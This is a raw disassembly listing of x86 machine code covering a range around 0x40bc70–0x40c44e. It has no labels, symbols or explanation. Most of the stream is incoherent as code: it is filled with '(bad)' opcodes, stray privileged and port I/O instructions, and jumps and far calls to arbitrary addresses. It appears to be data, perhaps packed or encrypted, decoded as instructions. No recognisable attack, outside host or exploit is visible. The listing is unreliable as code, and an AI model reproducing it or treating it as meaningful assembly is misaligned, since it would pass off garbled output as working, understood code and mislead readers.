  40bc70:	test   DWORD PTR ds:[edi+0x4],edi
  40bc74:	push   eax
  40bc75:	lea    ecx,[esi+0x15]
  40bc78:	add    al,BYTE PTR [eax]
  40bc7a:	(bad)  
  40bc7b:	lock sub ebx,DWORD PTR [edx+edi*4+0xe]
  40bc80:	sti    
  40bc81:	inc    ebx
  40bc82:	push   0x7e53899e
  40bc87:	cld    
  40bc88:	or     BYTE PTR [ebp+0x3318d4a6],dl
  40bc8e:	and    bh,al
  40bc90:	cmp    eax,0x8eef4e24
  40bc95:	mov    edi,0xc503b161
  40bc9a:	pop    edi
  40bc9b:	hlt    
  40bc9c:	add    al,BYTE PTR [eax]
  40bc9e:	bound  esp,QWORD PTR [ebx+0x49]
  40bca1:	cmp    edx,DWORD PTR [ecx]
  40bca3:	fs or  eax,0xb93eb152
  40bca9:	adc    al,0x9e
  40bcab:	push   es
  40bcac:	inc    edx
  40bcad:	add    cl,ch
  40bcaf:	mov    ds:0xa3d91be0,eax
  40bcb4:	loopne 0x40bcd5
  40bcb6:	loope  0x40bce3
  40bcb8:	push   es
  40bcb9:	add    edx,eax
  40bcbb:	outs   dx,DWORD PTR ds:[esi]
  40bcbc:	xor    eax,0x2df07624
  40bcc1:	or     DWORD PTR [eax],edi
  40bcc3:	mov    esp,0xeddb665c
  40bcc8:	test   ch,al
  40bcca:	pusha  
  40bccb:	jge    0x40bcca
  40bccd:	dec    esp
  40bcce:	add    BYTE PTR [eax-0x27],ah
  40bcd1:	out    0x3,eax
  40bcd3:	bound  ecx,QWORD PTR [ecx-0x3c5aadca]
  40bcd9:	xor    edx,DWORD PTR [edx]
  40bcdb:	and    bl,cl
  40bcdd:	push   0xffffffbf
  40bcdf:	imul   eax,DWORD PTR [edi-0x3649f17a],0x16d90427
  40bce9:	add    DWORD PTR ds:0x5a0f1931,0x17
  40bcf0:	add    al,0x5a
  40bcf3:	mov    al,ds:0x5eb1e7d4
  40bcf8:	rcr    esp,0x3f
  40bcfb:	(bad)  
  40bcfc:	fcmovbe st,st(4)
  40bcfe:	sti    
  40bcff:	scas   eax,DWORD PTR es:[edi]
  40bd00:	sbb    eax,esp
  40bd02:	das    
  40bd03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd04:	fst    DWORD PTR [ebp-0x26729148]
  40bd0a:	inc    ebx
  40bd0b:	(bad)
  40bd10:	xchg   ebp,eax
  40bd11:	out    0x2,eax
  40bd13:	mov    bh,0xbf
  40bd15:	nop    DWORD PTR [edx-0x27]
  40bd19:	out    0x7f,eax
  40bd1b:	frstor [ebp-0x8]
  40bd1e:	and    DWORD PTR [esi-0x3f],0x7c
  40bd22:	aas    
  40bd23:	(bad)  
  40bd24:	fisub  DWORD PTR [esi]
  40bd26:	(bad)  
  40bd27:	imul   esp,DWORD PTR [esi-0x55],0xa82beb03
  40bd2e:	add    ecx,DWORD PTR [esp+ebx*8+0x500043fc]
  40bd35:	cdq    
  40bd36:	out    0x55,eax
  40bd38:	and    DWORD PTR [edx+ebx*1+0x35694bae],eax
  40bd3f:	sub    al,0x52
  40bd41:	jb     0x40bd6e
  40bd43:	add    al,0xdb
  40bd45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd46:	(bad)  
  40bd47:	sub    eax,0x6000d91e
  40bd4c:	mov    bl,0xe0
  40bd4e:	addr16 and eax,0xd13dc5e
  40bd54:	pop    esp
  40bd55:	cdq    
  40bd56:	add    BYTE PTR [edx-0x5e],ch
  40bd59:	sar    ch,1
  40bd5b:	cld    
  40bd5c:	xor    edi,eax
  40bd5e:	inc    eax
  40bd5f:	jmp    0x2da89964
  40bd64:	data16 jno 0x40bd4b
  40bd67:	adc    BYTE PTR [edx],ah
  40bd69:	fscale 
  40bd6b:	fdivr  QWORD PTR [ecx-0x36]
  40bd6e:	inc    eax
  40bd6f:	jmp    0xda4d635a
  40bd74:	sub    eax,0x621487d9
  40bd79:	push   0xa4eee944
  40bd7e:	sbb    dl,bl
  40bd80:	xchg   ebp,eax
  40bd81:	fld    DWORD PTR [edi+0x446871fc]
  40bd87:	jmp    0xba556262
  40bd8c:	jge    0x40bd67
  40bd8e:	xchg   esp,esi
  40bd90:	in     eax,dx
  40bd91:	imul   eax,DWORD PTR [ecx+ebp*8-0x22],0x9a00a4
  40bd99:	fld    DWORD PTR gs:[edi+0x446869dc]
  40bda0:	jmp    0x2a9f9736
  40bda5:	and    esp,esi
  40bda7:	dec    esi
  40bda8:	dec    ah
  40bdaa:	fisubr DWORD PTR [edx-0x18]
  40bdad:	mov    ah,0xa4
  40bdaf:	add    BYTE PTR [ebx-0x30226cb],al
  40bdb5:	cmc    
  40bdb6:	leave  
  40bdb7:	inc    eax
  40bdb8:	jmp    0xc5ca42dd
  40bdbd:	out    0xef,al
  40bdbf:	dec    eax
  40bdc0:	call   0xca9726
  40bdc5:	stc    
  40bdc6:	lea    ecx,[ecx-0x49b6c90f]
  40bdcc:	(bad)  
  40bdcd:	hlt    
  40bdce:	and    cl,BYTE PTR [ebx-0x36e5c38]
  40bdd4:	inc    DWORD PTR [ecx+edx*2]
  40bdd7:	test   DWORD PTR [eax+0x50ff22c5],edi
  40bddd:	pop    ebp
  40bdde:	and    al,0x15
  40bde0:	xor    BYTE PTR [ecx-0x2da1ff69],bl
  40bde6:	push   ss
  40bde7:	sub    esp,0x77
  40bdea:	xchg   BYTE PTR [ebx+0x33],dl
  40bded:	ror    BYTE PTR [ebp+0x30b8c289],1
  40bdf3:	push   edi
  40bdf4:	mov    DWORD PTR [edi-0x4876ea05],edi
  40bdfa:	sti    
  40bdfb:	or     eax,0xfb170039
  40be00:	sbb    eax,0x76b50f
  40be05:	add    BYTE PTR [ebx],bh
  40be07:	push   eax
  40be08:	add    ch,BYTE PTR [eax+0x70c4e2b8]
  40be0e:	and    bl,BYTE PTR [ebx-0x356a0000]
  40be14:	ret    
  40be15:	jo     0x40bde9
  40be17:	call   0xf11:0xfaef8900
  40be1e:	mov    ?,WORD PTR [ebx+0x580bffff]
  40be24:	test   BYTE PTR ds:0x1735c14,0xfb
  40be2b:	(bad)  
  40be2c:	std    
  40be2d:	and    al,0x8e
  40be2f:	dec    esp
  40be30:	scas   al,BYTE PTR es:[edi]
  40be31:	inc    eax
  40be32:	or     esi,DWORD PTR [esi+0x19]
  40be35:	jae    0x40be76
  40be37:	aad    0xba
  40be39:	out    dx,al
  40be3a:	sti    
  40be3b:	(bad)  
  40be3c:	add    BYTE PTR [ebx-0x17e7479e],cl
  40be42:	dec    ebp
  40be43:	or     esi,DWORD PTR [esi+edi*8-0xa81df27]
  40be4a:	push   ebp
  40be4b:	je     0x40be9c
  40be4d:	add    DWORD PTR [edx-0x10],esp
  40be50:	bound  ebx,QWORD PTR [ebx]
  40be52:	xor    DWORD PTR [esp+eax*1+0x1f0b2ba],esi
  40be59:	add    cl,bl
  40be5b:	test   al,0x18
  40be5d:	mov    edi,0x410f14
  40be62:	add    BYTE PTR [edx-0x72014c5e],cl
  40be68:	(bad)  
  40be69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6a:	push   0x3aaf01e
  40be6f:	arpl   ax,si
  40be71:	add    DWORD PTR [ecx+0x3ddf56],esp
  40be77:	test   al,0x83
  40be79:	add    al,0x0
  40be7b:	bound  esp,QWORD PTR [edi+0x4c]
  40be7e:	sbb    al,0x4a
  40be80:	(bad)  
  40be81:	mov    bl,0xfe
  40be83:	push   ebp
  40be84:	ja     0x40be3a
  40be86:	test   BYTE PTR [ebx+eiz*8+0x7d],dl
  40be8a:	adc    eax,0xbf01f063
  40be8f:	or     dh,cl
  40be91:	aas    
  40be92:	add    BYTE PTR [ebx-0x36],cl
  40be95:	add    al,0x0
  40be97:	bound  esp,QWORD PTR [edi-0x13]
  40be9a:	fwait
  40be9b:	dec    esp
  40be9c:	xor    BYTE PTR [edx],al
  40be9e:	mov    edi,0x410c1a
  40bea3:	or     edi,DWORD PTR [edx+0x67620004]
  40bea9:	in     eax,dx
  40beaa:	jmp    0x40bf1d
  40beac:	xor    BYTE PTR [edx],al
  40beae:	mov    edi,0x401e0b
  40beb3:	or     ebp,DWORD PTR [edx-0x269dfffc]
  40beb9:	jb     0x40bea9
  40bebb:	add    esi,eax
  40bebd:	daa    
  40bebe:	add    al,0x1d
  40bec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec1:	sbb    al,BYTE PTR [edx+0x62]
  40bec4:	lock jge 0x40beca
  40bec7:	add    BYTE PTR [edx-0x27],ah
  40beca:	jb     0x40beba
  40becc:	mov    ebp,0xfd0427c5
  40bed1:	popa   
  40bed2:	cli    
  40bed3:	inc    ecx
  40bed4:	(bad)  
  40bed5:	lock dec ebp
  40bed7:	add    esp,DWORD PTR [edx-0x27]
  40beda:	popa   
  40bedb:	mov    al,0xa5
  40bedd:	(bad)  
  40bedf:	stos   DWORD PTR es:[edi],eax
  40bee0:	mov    ecx,0xe8b496da
  40bee5:	call   0x559d6c4e
  40beea:	inc    eax
  40beeb:	add    esp,DWORD PTR [edx-0x27]
  40beee:	ds aad 0xea
  40bef1:	xchg   edi,eax
  40bef2:	out    0x80,eax
  40bef4:	fld    QWORD PTR ss:[eax]
  40bef7:	inc    eax
  40bef8:	(bad)  
  40bef9:	(bad)  
  40befb:	aaa    
  40befc:	(bad)  [ebx+eax*1-0x1831e7ec]
  40bf03:	add    esp,DWORD PTR [edx-0x3f]
  40bf06:	xchg   ebp,eax
  40bf07:	mov    ch,0x4c
  40bf09:	(bad)  [edx-0x17e24549]
  40bf0f:	test   al,0xc4
  40bf11:	xchg   ebx,eax
  40bf12:	cmp    DWORD PTR [ebx],eax
  40bf14:	(bad)  
  40bf15:	fnstcw WORD PTR [edi]
  40bf17:	pop    esi
  40bf18:	das    
  40bf19:	fldenv [esi]
  40bf1b:	mov    BYTE PTR ds:0xe604155f,dh
  40bf21:	pop    edx
  40bf22:	out    0x3,eax
  40bf24:	bound  ebx,QWORD PTR [eax-0x265d7643]
  40bf2a:	adc    bh,BYTE PTR [eax+eax*1+0xdb40ed8]
  40bf31:	mov    ds:0xfc3600d9,al
  40bf36:	cmp    DWORD PTR [edi],0xffffffe9
  40bf39:	mov    edx,0xf61c8a17
  40bf3e:	out    dx,al
  40bf3f:	inc    eax
  40bf40:	jmp    0x28ecaf95
  40bf45:	pop    esi
  40bf46:	les    esi,FWORD PTR [edx]
  40bf48:	(bad)  
  40bf49:	retf   
  40bf4a:	add    BYTE PTR [edi],dl
  40bf4c:	sub    DWORD PTR [esi-0x68],ebx
  40bf4f:	push   0xffffff8c
  40bf51:	daa    
  40bf52:	fldl2t 
  40bf54:	or     al,0x35
  40bf56:	or     eax,0xd921d72d
  40bf5b:	mov    ebp,0x119056d
  40bf60:	xchg   edx,eax
  40bf61:	outs   dx,BYTE PTR ds:[esi]
  40bf62:	fs xor ecx,ebp
  40bf65:	jnp    0x40bf80
  40bf67:	add    DWORD PTR [esi-0x4e],ecx
  40bf6a:	cmp    DWORD PTR [edi],0xffffffe9
  40bf6d:	in     al,0xe3
  40bf6f:	mov    DWORD PTR [ecx+esi*2-0xf16bf12],esi
  40bf76:	jmp    0xd44:0x646628ae
  40bf7d:	dec    edx
  40bf7e:	pop    esp
  40bf7f:	in     al,dx
  40bf80:	in     eax,dx
  40bf81:	fsubr  QWORD PTR [edi+0x8d72189]
  40bf87:	mov    cl,dl
  40bf89:	sar    DWORD PTR gs:[eax-0x63],0x5f
  40bf8e:	fld    DWORD PTR [ebx-0x1184ffd7]
  40bf94:	mov    DWORD PTR [ebp-0x5bbe17c3],esp
  40bf9a:	cmp    al,0x44
  40bf9c:	and    eax,0x89e772c9
  40bfa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfa2:	add    eax,0xd38ce7f0
  40bfa7:	(bad)  
  40bfa8:	std    
  40bfa9:	push   0xffffffce
  40bfab:	(bad)  
  40bfac:	jmp    0xc397b8b1
  40bfb1:	pop    edi
  40bfb2:	(bad)  [eax]
  40bfb4:	pop    edx
  40bfb5:	add    DWORD PTR [edi-0x27],0xffffffc2
  40bfb9:	add    al,0xfb
  40bfbb:	imul   edx,DWORD PTR [edi+ebp*4],0x3b
  40bfbf:	fst    QWORD PTR [edx-0x51]
  40bfc2:	mov    ebx,ebp
  40bfc4:	js     0x40bf75
  40bfc6:	mov    ebx,ebp
  40bfc8:	mov    BYTE PTR [edi-0x50672285],ch
  40bfce:	jnp    0x40bfad
  40bfd0:	test   al,0xaf
  40bfd2:	mov    ebx,ebp
  40bfd4:	mov    eax,0xeddd8baf
  40bfd9:	scas   eax,DWORD PTR es:[edi]
  40bfda:	jnp    0x40bfb9
  40bfdc:	or     dh,BYTE PTR [eax-0x4fea2285]
  40bfe2:	dec    ebx
  40bfe3:	frstor [eax+esi*4]
  40bfe6:	dec    ebx
  40bfe7:	(bad)  [edi]
  40bfe9:	mov    al,0x3b
  40bfeb:	fnstsw WORD PTR [esi]
  40bfed:	mov    al,0x3b
  40bfef:	fisttp QWORD PTR [ecx-0x50]
  40bff2:	dec    ebx
  40bff3:	fst    QWORD PTR [esi-0x18]
  40bff6:	add    BYTE PTR [edx+0x3dfffe88],al
  40bffc:	sub    BYTE PTR [eax+0x44],0x7b
  40c000:	xor    esi,edi
  40c002:	adc    eax,0x40ed0f
  40c007:	mov    ds:0x3b024d91,eax
  40c00c:	bound  edi,QWORD PTR [ebp-0x1ceaf8c]
  40c012:	adc    eax,0x40ed0b
  40c017:	cmp    DWORD PTR [ebx-0x22543ca5],ebx
  40c01d:	pop    esi
  40c01e:	ret    
  40c01f:	push   ebx
  40c020:	das    
  40c021:	push   eax
  40c022:	add    cl,BYTE PTR [ebx]
  40c024:	repz in al,0x69
  40c027:	bound  eax,QWORD PTR [ecx+eax*1+0x138077ff]
  40c02e:	inc    eax
  40c02f:	bound  eax,QWORD PTR [ebx]
  40c031:	pop    eax
  40c032:	call   0x443237
  40c037:	jmp    0x7c24db0c
  40c03c:	jl     0x40c03f
  40c03e:	dec    DWORD PTR [edi+0x0]
  40c041:	pop    ss
  40c042:	inc    eax
  40c043:	(bad)
  40c048:	mov    edi,0x832cbf95
  40c04d:	push   ebx
  40c04e:	mov    ah,BYTE PTR [esi]
  40c050:	in     al,0x0
  40c052:	push   esi
  40c053:	adc    eax,0xbb8ab74b
  40c058:	inc    esp
  40c059:	int3   
  40c05a:	jae    0x40c05c
  40c05c:	pop    edi
  40c05d:	cwde   
  40c05e:	xchg   ebp,eax
  40c05f:	(bad)  
  40c060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c061:	jg     0x40bfeb
  40c063:	mov    edi,0xbff3bc17
  40c068:	mov    DWORD PTR [ebx-0x2fb98c50],ebp
  40c06e:	jl     0x40c045
  40c070:	(bad)  [edi+0x577f7b9c]
  40c076:	mov    al,0x8a
  40c078:	jb     0x40c0bf
  40c07a:	mov    ebx,0xcc3c507e
  40c07f:	jae    0x40c0e0
  40c081:	sub    BYTE PTR [esi+edi*8-0x400bc8a3],cl
  40c088:	fbstp  TBYTE PTR ds:0x1b229400
  40c08e:	sbb    eax,DWORD PTR [ecx+ebp*1-0x2717ee6c]
  40c095:	push   ss
  40c096:	mov    al,0xfe
  40c098:	fdivp  st(7),st
  40c09a:	xor    eax,0xb0403a07
  40c09f:	(bad)  
  40c0a0:	and    eax,0xcdc512d9
  40c0a5:	xlat   BYTE PTR ds:[ebx]
  40c0a6:	mov    esi,0xdf9bb951
  40c0ab:	add    esi,DWORD PTR [ecx-0x61e8f0d1]
  40c0b1:	jmp    0x40c05a
  40c0b3:	add    ebp,ecx
  40c0b5:	enter  0x5f0f,0x23
  40c0b9:	fsub   st,st(7)
  40c0bb:	xchg   DWORD PTR [ebp+0x7cc34c],ebp
  40c0c1:	push   esi
  40c0c2:	fst    DWORD PTR [ecx+0x48]
  40c0c5:	bound  ebx,QWORD PTR [edx-0x20]
  40c0c8:	mov    al,0x51
  40c0ca:	stc    
  40c0cb:	cmp    BYTE PTR [ecx+0x43fa0d76],dh
  40c0d1:	bound  ebx,QWORD PTR [edi+eiz*4+0x36]
  40c0d5:	push   edi
  40c0d6:	inc    ebx
  40c0d7:	jmp    0x421a2f8c
  40c0dc:	dec    eax
  40c0dd:	(bad)  
  40c0de:	(bad)  
  40c0df:	aam    0xef
  40c0e1:	push   ebx
  40c0e2:	sbb    eax,ebp
  40c0e4:	xchg   ch,bl
  40c0e6:	in     eax,0x74
  40c0e8:	les    ecx,FWORD PTR [eax+0x37ccd9da]
  40c0ee:	(bad)  
  40c0ef:	hlt    
  40c0f0:	cmp    esi,DWORD PTR [eax+0x19]
  40c0f3:	call   0x23776175
  40c0f8:	lds    ecx,FWORD PTR [edi]
  40c0fa:	(bad)  
  40c0fb:	fadd   QWORD PTR [edi+0x50]
  40c0fe:	sbb    eax,ebp
  40c100:	jl     0x40c177
  40c102:	inc    edx
  40c103:	call   0xd21a57b8
  40c108:	inc    edi
  40c109:	(bad)  
  40c10a:	aam    0xfc
  40c10c:	out    dx,eax
  40c10d:	jae    0x40c128
  40c10f:	call   0xb030066d
  40c114:	adc    eax,0xc49dd9a2
  40c119:	jo     0x40c0b4
  40c11b:	add    BYTE PTR [ebx],ch
  40c11d:	sub    ebp,edx
  40c11f:	addr16 jmp 0x40c0bb
  40c122:	xchg   edi,eax
  40c123:	or     al,0xe9
  40c125:	add    bl,bl
  40c127:	sbb    BYTE PTR ds:0x8a2b60e5,ah
  40c12d:	sbb    BYTE PTR [edx],bl
  40c12f:	(bad)  
  40c131:	jb     0x40c0d4
  40c133:	fnstenv [esp+ebp*8-0x27]
  40c137:	lods   eax,DWORD PTR ds:[esi]
  40c138:	push   esi
  40c139:	jmp    0x40c19c
  40c13b:	pusha  
  40c13c:	(bad)  
  40c13d:	xchg   edi,eax
  40c13e:	daa    
  40c13f:	fld    DWORD PTR [eax]
  40c141:	bound  esp,QWORD PTR ds:0x3dd004fd
  40c147:	cs add ebp,ecx
  40c14a:	pop    eax
  40c14b:	and    BYTE PTR ds:0x5695eeed,ah
  40c151:	jmp    0x40c1b4
  40c153:	sub    dl,BYTE PTR [edx+0x72]
  40c156:	test   al,0x2d
  40c158:	mov    ch,BYTE PTR [edx+0x1f01b4e1]
  40c15e:	adc    eax,0x4e054c62
  40c163:	pop    eax
  40c164:	call   0x49411752
  40c169:	adc    eax,0xfe751c7f
  40c16e:	or     BYTE PTR [eax],bl
  40c170:	and    eax,0xd94daed
  40c175:	ins    DWORD PTR es:[edi],dx
  40c176:	ins    DWORD PTR es:[edi],dx
  40c177:	fiadd  DWORD PTR [eax]
  40c179:	jmp    0xe997961a
  40c17e:	popa   
  40c17f:	(bad)  
  40c181:	aad    0x5e
  40c183:	fld    DWORD PTR [eax]
  40c185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c186:	data16 fld DWORD PTR [eax]
  40c189:	sub    DWORD PTR [eax],eax
  40c18b:	stc    
  40c18c:	fistp  QWORD PTR [ebx+0x40d961e9]
  40c192:	inc    edx
  40c193:	pop    ebx
  40c194:	xchg   esi,eax
  40c195:	add    BYTE PTR [eax],al
  40c197:	dec    ebx
  40c198:	fadd   DWORD PTR [eax-0x1c07775]
  40c19e:	push   es
  40c19f:	cmp    ebx,eax
  40c1a1:	and    edx,eax
  40c1a3:	mov    dl,0xdd
  40c1a5:	add    al,0x0
  40c1a7:	or     edi,DWORD PTR [edi+0xc337fc0]
  40c1ad:	and    BYTE PTR [ebp+0x3d1c113b],al
  40c1b3:	sti    
  40c1b4:	fadd   QWORD PTR [eax]
  40c1b6:	add    BYTE PTR [edi-0x16],bh
  40c1b9:	cmp    eax,DWORD PTR [eax]
  40c1bb:	or     eax,ebx
  40c1bd:	add    BYTE PTR [ebp+ecx*8-0x38],dh
  40c1c1:	std    
  40c1c2:	add    bh,bl
  40c1c4:	xlat   BYTE PTR ds:[ebx]
  40c1c5:	jae    0x40c170
  40c1c7:	xor    edi,edx
  40c1c9:	jmp    0xea21f2d4
  40c1ce:	add    ah,BYTE PTR [ecx]
  40c1d0:	fcomp  DWORD PTR [ebp-0x15]
  40c1d3:	into   
  40c1d4:	enter  0x4fd,0xcb
  40c1d8:	xlat   BYTE PTR ds:[ebx]
  40c1d9:	je     0x40c1e6
  40c1db:	mov    dh,0xd7
  40c1dd:	push   es
  40c1de:	add    BYTE PTR [ebx-0x6c4caf5],bh
  40c1e4:	adc    BYTE PTR [ebx+0x6b1ac433],cl
  40c1ea:	or     BYTE PTR [ecx-0x23],dh
  40c1ed:	std    
  40c1ee:	xor    eax,0x45044300
  40c1f3:	add    ah,dl
  40c1f5:	lock cld 
  40c1f7:	adc    BYTE PTR [ebx-0x23],cl
  40c1fa:	mov    eax,esi
  40c1fc:	dec    BYTE PTR [ebp+0x1c001b74]
  40c202:	and    eax,0xe97fe1c
  40c207:	test   bl,bl
  40c209:	(bad)  
  40c20a:	add    BYTE PTR [eax],al
  40c20c:	jl     0x40c1e4
  40c20e:	or     BYTE PTR [eax],al
  40c210:	(bad)  
  40c211:	rol    BYTE PTR [ecx],0xe9
  40c214:	ffreep st(0)
  40c216:	add    DWORD PTR [eax],eax
  40c218:	enter  0x9ac5,0xb6
  40c21c:	enter  0x17bc,0x0
  40c220:	sub    eax,0x9e7f39d6
  40c225:	shr    BYTE PTR [esi+0x41d11e14],0x0
  40c22c:	fild   WORD PTR [eax]
  40c22e:	ss add eax,0xeaaeb8e1
  40c234:	pusha  
  40c235:	scas   eax,DWORD PTR es:[edi]
  40c236:	rol    eax,0x9
  40c239:	rol    BYTE PTR [ecx+0x44963e2],0x88
  40c240:	mov    esp,es
  40c242:	mov    BYTE PTR [edi+0x437ab06f],bh
  40c248:	xchg   ah,bl
  40c24a:	test   DWORD PTR [edi-0x3bf7b2],edi
  40c250:	rol    BYTE PTR gs:[ecx],0x0
  40c254:	add    BYTE PTR [ecx+0x62801d00],bh
  40c25a:	rol    BYTE PTR [ecx],0x57
  40c25d:	dec    eax
  40c25e:	mov    edi,0xe436ff56
  40c263:	in     al,0x8a
  40c265:	call   0x85c0:0x609a2398
  40c26c:	mov    edi,0xc578bc0e
  40c271:	jns    0x40c20d
  40c273:	js     0x40c2f0
  40c275:	les    eax,FWORD PTR ds:[esi-0x53380902]
  40c27c:	adc    al,0x1e
  40c27e:	scas   al,BYTE PTR es:[edi]
  40c27f:	inc    ecx
  40c280:	add    bl,bl
  40c282:	ret    
  40c283:	js     0x40c2c2
  40c285:	fild   WORD PTR [ebx+0x39]
  40c288:	push   cs
  40c289:	jmp    0x84dcf966
  40c28e:	outs   dx,DWORD PTR ds:[esi]
  40c28f:	jmp    0x3fe29b97
  40c294:	cs scas eax,DWORD PTR es:[edi]
  40c296:	xlat   BYTE PTR ds:[ebx]
  40c297:	out    0x78,eax
  40c299:	das    
  40c29a:	sar    DWORD PTR [esi+0x6ad96056],0xbc
  40c2a1:	sub    al,0x32
  40c2a3:	xchg   esi,eax
  40c2a4:	dec    esi
  40c2a5:	mov    DWORD PTR [eax],esi
  40c2a7:	sub    bh,ah
  40c2a9:	sbb    eax,0x5438305d
  40c2ae:	push   esi
  40c2af:	and    BYTE PTR [ebp-0x2d92ef6f],ch
  40c2b5:	xchg   ecx,eax
  40c2b6:	or     al,0x6b
  40c2b8:	xor    BYTE PTR [eax],al
  40c2ba:	inc    esi
  40c2bb:	fucom  st(7)
  40c2bd:	js     0x40c329
  40c2bf:	push   esp
  40c2c0:	repnz sbb DWORD PTR [ebp+0x503bdcd2],edx
  40c2c7:	sbb    eax,ebp
  40c2c9:	cwde   
  40c2ca:	outs   dx,DWORD PTR ds:[esi]
  40c2cb:	rcr    BYTE PTR [ebx-0x18],cl
  40c2ce:	popa   
  40c2cf:	daa    
  40c2d0:	shl    BYTE PTR [edx-0x79182915],1
  40c2d6:	add    eax,0xe9560550
  40c2db:	dec    esp
  40c2dc:	or     al,0x0
  40c2de:	(bad)  
  40c2e0:	xor    edi,esp
  40c2e2:	lods   al,BYTE PTR ds:[esi]
  40c2e3:	jmp    0x40c310
  40c2e5:	adc    ah,BYTE PTR [edx]
  40c2e7:	fldenv [eax+0x5]
  40c2ea:	cmp    al,0xbe
  40c2ec:	cmc    
  40c2ed:	js     0x40c310
  40c2ef:	std    
  40c2f0:	out    dx,eax
  40c2f1:	xchg   ch,cl
  40c2f3:	dec    esp
  40c2f4:	out    dx,al
  40c2f5:	les    eax,FWORD PTR [ebp+0x6203e82a]
  40c2fb:	push   esi
  40c2fc:	scas   eax,DWORD PTR es:[edi]
  40c2fd:	lods   al,BYTE PTR ds:[esi]
  40c2fe:	mov    ds:0xd956e7e0,eax
  40c303:	les    eax,FWORD PTR [eax]
  40c305:	sbb    BYTE PTR [esi+ebx*2],cl
  40c308:	out    dx,eax
  40c309:	push   ss
  40c30a:	fcmovnbe st,st(2)
  40c30c:	sbb    DWORD PTR [edi-0x73],0x20
  40c310:	sbb    BYTE PTR [edi-0x2],0x4c
  40c314:	dec    ebx
  40c315:	ins    BYTE PTR es:[edi],dx
  40c316:	test   BYTE PTR [edi+eax*2+0x69],0x8f
  40c31b:	aad    0x0
  40c31d:	mov    ebp,0xe643400
  40c322:	shl    DWORD PTR [ebx+0x43],cl
  40c325:	add    ebx,eax
  40c327:	popa   
  40c328:	shr    DWORD PTR [ebx+edx*2+0x63],0xd9
  40c32d:	mov    edi,ebp
  40c32f:	call   0x4b5e:0x61930945
  40c336:	adc    eax,0xe5627b0
  40c33b:	icebp  
  40c33c:	iret   
  40c33d:	adc    esp,DWORD PTR [ecx]
  40c33f:	push   ebx
  40c340:	sbb    DWORD PTR [ecx],eax
  40c342:	and    DWORD PTR fs:[ebp+0x8],ecx
  40c346:	mov    al,0x2c
  40c348:	int    0x73
  40c34a:	in     eax,0x5a
  40c34c:	xchg   esi,eax
  40c34d:	jmp    0xd86185a
  40c352:	adc    BYTE PTR fs:[ebp+0x16],cl
  40c356:	(bad)  
  40c357:	jae    0x40c36e
  40c359:	adc    ebp,DWORD PTR [ecx]
  40c35b:	bound  ax,DWORD PTR [esi]
  40c35e:	sar    BYTE PTR [ebx-0x1d12bc9d],cl
  40c364:	nop
  40c365:	je     0x40c356
  40c367:	mov    al,ds:0x61e956d0
  40c36c:	fld    DWORD PTR [ecx+0x5f2fc9b1]
  40c372:	mov    al,0xa4
  40c374:	fadd   DWORD PTR [eax]
  40c376:	cmp    al,0x5
  40c378:	les    ecx,FWORD PTR [edi+0x38]
  40c37b:	adc    BYTE PTR [edi+ebp*8+0x0],ah
  40c37f:	push   es
  40c380:	mov    esi,DWORD PTR [ecx+0x61]
  40c383:	add    al,bh
  40c385:	cmp    dh,0x74
  40c388:	dec    edi
  40c389:	push   eax
  40c38a:	inc    ebp
  40c38b:	or     BYTE PTR [eax],bl
  40c38d:	lea    ebp,[edx]
  40c38f:	shl    DWORD PTR [edi],0xe1
  40c392:	dec    eax
  40c393:	je     0x40c3e9
  40c395:	adc    al,0x75
  40c397:	xadd   BYTE PTR [edx],dl
  40c39a:	or     eax,0x52098285
  40c39f:	(bad)  
  40c3a0:	dec    edx
  40c3a1:	sub    eax,DWORD PTR [ecx]
  40c3a3:	add    BYTE PTR [ebx],bh
  40c3a5:	outs   dx,DWORD PTR ds:[esi]
  40c3a6:	dec    edx
  40c3a7:	push   0x39
  40c3a9:	sbb    eax,0x8d1803ea
  40c3ae:	inc    eax
  40c3af:	mov    ecx,DWORD PTR [ecx+0x26]
  40c3b2:	mov    cl,BYTE PTR [esi]
  40c3b4:	loop   0x40c3dc
  40c3b6:	push   ecx
  40c3b7:	call   0x402208
  40c3bc:	xchg   DWORD PTR [ebp-0x2c8feb8f],edx
  40c3c2:	mov    WORD PTR [ebp+0x63],es
  40c3c5:	and    eax,0xd7929ce9
  40c3ca:	add    BYTE PTR [ebx+ecx*4-0x7974fbf7],al
  40c3d1:	jge    0x40c3bd
  40c3d3:	and    DWORD PTR [eax+0x9],edx
  40c3d6:	or     eax,0x15ffa585
  40c3db:	push   DWORD PTR [esi-0x34bfecf1]
  40c3e1:	dec    esp
  40c3e2:	add    al,0xeb
  40c3e4:	mov    esi,0xc454e
  40c3e9:	ss pushf 
  40c3eb:	jno    0x40c3f3
  40c3ed:	(bad)  
  40c3ee:	fist   DWORD PTR [ebp+0x0]
  40c3f1:	mov    ebx,ebx
  40c3f3:	or     eax,0xc2c821ec
  40c3f9:	bound  edi,QWORD PTR [edx+0x70e95601]
  40c3ff:	xchg   bh,al
  40c401:	jne    0x40c43f
  40c403:	mov    al,0x73
  40c405:	inc    edi
  40c406:	fwait
  40c407:	mov    cl,0x73
  40c409:	inc    ebx
  40c40a:	out    dx,eax
  40c40b:	jge    0x40c44a
  40c40d:	out    0x3f,eax
  40c40f:	cs push cs
  40c411:	jmp    0xeaef5e1d
  40c416:	ret    0x8b01
  40c419:	adc    eax,0x6052a819
  40c41e:	sar    BYTE PTR [esi-0x33],0x4a
  40c422:	adc    BYTE PTR [edi+0x2],dl
  40c425:	(bad)  
  40c427:	rcr    DWORD PTR [esi-0x7c],0x3
  40c42b:	adc    ecx,0x1c2b696
  40c431:	lods   eax,DWORD PTR ds:[esi]
  40c432:	rol    BYTE PTR [ecx],0x0
  40c435:	lods   al,BYTE PTR ds:[esi]
  40c436:	add    edx,DWORD PTR [ecx-0x75]
  40c439:	idiv   BYTE PTR [ebx]
  40c43b:	cmp    DWORD PTR [eax],ebx
  40c43d:	jecxz  0x40c40b
  40c43f:	cli    
  40c440:	add    DWORD PTR [edx-0x40],esp
  40c443:	js     0x40c3c9
  40c445:	jmp    0x2dc7:0x92fea7cd
  40c44c:	or     BYTE PTR [eax],al
  40c44e:	retf   0x38d
